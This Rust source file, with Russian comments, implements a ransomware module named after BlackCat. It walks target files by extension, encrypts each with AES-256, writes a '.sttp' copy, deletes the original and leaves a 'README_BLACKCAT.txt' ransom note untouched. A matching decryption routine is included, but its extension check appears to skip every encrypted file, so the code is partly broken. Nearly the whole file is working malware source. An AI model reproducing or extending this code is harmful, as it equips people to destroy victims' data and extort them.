use crate::crypto::CryptoEngine;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::fs;
use std::path::Path;
use log::{info, warn, error};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RansomwareConfig {
    pub target_paths: Vec<String>,
    pub file_extensions: Vec<String>,
    pub encryption_algorithm: String,
    pub max_parallelism: usize,
}

pub struct BlackCatRansomware;

impl BlackCatRansomware {
    pub async fn encrypt_all_files(
        files: Vec<String>,
        config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        info!("Starting encryption of {} files", files.len());
        
        for file in files {
            // Пропускаем файлы с расширением .sttp и ransom note
            if file.ends_with(".sttp") || file.contains("README_BLACKCAT.txt") {
                continue;
            }
            
            // Проверяем расширение файла
            if let Some(ext) = Path::new(&file).extension() {
                let ext_str = ext.to_string_lossy().to_lowercase();
                if !config.file_extensions.iter().any(|e| ext_str == e.to_lowercase()) {
                    continue;
                }
            } else {
                continue;
            }
            
            // Читаем файл
            let content = match fs::read(&file) {
                Ok(c) => c,
                Err(e) => {
                    warn!("Failed to read file {}: {}", file, e);
                    continue;
                }
            };
            
            info!("Encrypting file: {}", file);
            
            // Шифруем файл
            let encrypted = match crypto_engine.encrypt_aes_256(&content) {
                Ok(e) => e,
                Err(e) => {
                    error!("Failed to encrypt file {}: {}", file, e);
                    continue;
                }
            };
            
            // Добавляем расширение .sttp
            let new_path = format!("{}.sttp", file);
            
            // Записываем зашифрованный файл
            if let Err(e) = fs::write(&new_path, encrypted) {
                error!("Failed to write encrypted file {}: {}", new_path, e);
                continue;
            }
            
            // Удаляем оригинальный файл
            if let Err(e) = fs::remove_file(&file) {
                warn!("Failed to remove original file {}: {}", file, e);
            }
            
            info!("Successfully encrypted: {} -> {}", file, new_path);
        }
        
        info!("Encryption completed");
        Ok(())
    }

    pub async fn decrypt_all_files(
        files: Vec<String>,
        config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        info!("Starting decryption of {} files", files.len());
        
        for file in files {
            // Расшифровываем ТОЛЬКО файлы .sttp
            if !file.ends_with(".sttp") {
                warn!("Skipping non-.sttp file: {}", file);
                continue;
            }
            
            // Проверяем расширение файла
            if let Some(ext) = Path::new(&file).extension() {
                let ext_str = ext.to_string_lossy().to_lowercase();
                if !config.file_extensions.iter().any(|e| ext_str == e.to_lowercase()) {
                    warn!("Skipping file with wrong extension: {}", file);
                    continue;
                }
            }
            
            info!("Decrypting file: {}", file);
            
            // Читаем зашифрованный файл
            let content = match fs::read(&file) {
                Ok(c) => c,
                Err(e) => {
                    error!("Failed to read encrypted file {}: {}", file, e);
                    continue;
                }
            };
            
            // Определяем алгоритм дешифрования
            let use_chacha20 = config.encryption_algorithm == "chacha20";
            
            // Дешифруем файл
            let decrypted = match crypto_engine.decrypt_file(&content, use_chacha20) {
                Ok(d) => d,
                Err(e) => {
                    error!("Failed to decrypt file {}: {}. Make sure you're using the correct key.", file, e);
                    continue;
                }
            };
            
            // Убираем расширение .sttp для восстановления оригинала
            let original_path = file.trim_end_matches(".sttp").to_string();
            
            // Записываем расшифрованный файл
            if let Err(e) = fs::write(&original_path, &decrypted) {
                error!("Failed to write decrypted file {}: {}", original_path, e);
                continue;
            }
            
            // Удаляем зашифрованный файл
            if let Err(e) = fs::remove_file(&file) {
                warn!("Failed to remove encrypted file {}: {}", file, e);
            }
            
            info!("Successfully decrypted: {} -> {}", file, original_path);
        }
        
        info!("Decryption completed");
        Ok(())
    }
}